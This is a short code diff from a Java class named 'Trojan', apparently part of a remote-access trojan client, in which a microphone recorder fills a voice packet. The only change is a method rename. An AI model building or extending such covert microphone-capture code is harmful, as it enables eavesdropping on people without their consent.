@@ -17,7 +17,7 @@ public final class Trojan implements IClientObserver {
 			final VoiceRecorder recorder = new VoiceRecorder();
 			final VoicePacket voice = (VoicePacket)packet;
 			
-			recorder.setMaximum(MICROPHONE_BUFFER_SIZE);
+			recorder.setLimit(MICROPHONE_BUFFER_SIZE);
 			recorder.addListener((source, data) -> {
 				voice.setData(data);
 				
